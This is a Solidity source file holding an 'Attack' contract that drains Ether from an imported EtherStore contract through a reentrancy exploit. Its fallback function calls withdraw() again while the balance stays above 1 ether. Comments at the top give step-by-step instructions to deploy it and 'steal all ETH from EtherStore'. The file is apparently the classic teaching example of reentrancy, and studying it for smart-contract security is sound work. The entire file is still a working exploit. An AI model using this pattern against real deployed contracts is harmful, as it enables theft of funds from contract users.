// SPDX-License-Identifier: MIT

import "contracts/EtherStore.sol";

pragma solidity 0.8.20;

// Deploy EtherStore and deposit to EtherStore first
// Deploy Attack with Etherstore contract address
// Check getBalance() from EtherStore to check AttackContract Balance
// Go attack() with 1 ETH (msg.value) deposit to steal all ETH from EtherStore
// Verify getBalance() from Attack contract that got all fund

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function withdraw() public {
        payable(address(msg.sender)).transfer(address(this).balance);
    }
}
